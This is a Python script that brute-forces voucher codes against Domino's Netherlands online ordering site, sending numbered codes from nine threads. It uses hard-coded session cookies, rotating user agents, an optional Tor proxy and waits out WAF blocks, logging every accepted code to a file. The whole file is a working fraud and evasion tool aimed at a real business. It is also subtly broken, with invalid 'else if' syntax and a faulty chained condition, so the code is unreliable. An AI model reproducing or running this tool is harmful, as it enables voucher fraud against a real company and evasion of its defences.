# CREATED BY SEM VOIGTLANDER
# FOR HUNGER AND EDUCATIONAL OR ANTICAPITALISTIC PURPOSES ONLY.
import os
import sys
import requests
import requests.utils
from bs4 import BeautifulSoup
import time
import json
import random
import string
import urllib
import urllib2
import httplib2
import cookielib
import thread
from random import randint
from fake_useragent import UserAgent
def bruteforce(begin, end):
        sessions = ["fpr55anjvayrhgv4qzlmmnri", "fdhydfwxdvzx03exlib3l0z5"]
        f = "output.txt"
        http = httplib2.Http()
        if(len(sys.argv) > 1):
            if(sys.argv[1] == "--tor"):
                http = httplib2.Http(proxy_info=httplib2.ProxyInfo(httplib2.socks.PROXY_TYPE_SOCKS5, 'localhost', 9050))
        count = begin
        sid = sessions[randint(0,1)]
        headers = {'Cookie':'ASP.NET_SessionId='+str(sid),
                   'User-Agent': UserAgent().random,
                   'Accept': 'text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
                   'Accept-Encoding': 'UTF-8',
                   'Accept-Language': 'en-US,en;q=0.8',
                   'Connection': 'keep-alive',
                   'Referer':'https://bestellen.dominos.nl'}
        while(count < end):
            url = "https://bestellen.dominos.nl/estore/nl/Basket/ApplyVoucher?voucherCode="+str(count)+"&addFromVoucherBox=false"
            response, content = http.request(url, 'POST', headers=headers) 
            count=count+1
            if "permission" in content:
                print("Sleeping 60 seconds as we are blocked by the WAF")
                time.sleep(60)
            if "niet geldig" and "niet geaccepteerd" and "permission" not in content:
                print(str(content))
                out = open(f,"a+ ")
                out.write(content+"\n")
                out.close()
            else if "niet geldig" or "niet geaccepteerd" in content:
                print("Thread: "+str((count/end)*100)+ "%")
            time.sleep(randint(1,4))
try:
    thread.start_new_thread(bruteforce, (10000, 20000))
    thread.start_new_thread(bruteforce, (20001, 30000))
    thread.start_new_thread(bruteforce, (30001, 40000))
    thread.start_new_thread(bruteforce, (40001, 50000))
    thread.start_new_thread(bruteforce, (50001, 60000))
    thread.start_new_thread(bruteforce, (60001, 70000))
    thread.start_new_thread(bruteforce, (70001, 80000))
    thread.start_new_thread(bruteforce, (80001, 90000))
    thread.start_new_thread(bruteforce, (90001, 100000))
except:
    print "Error"

while 1:
    pass
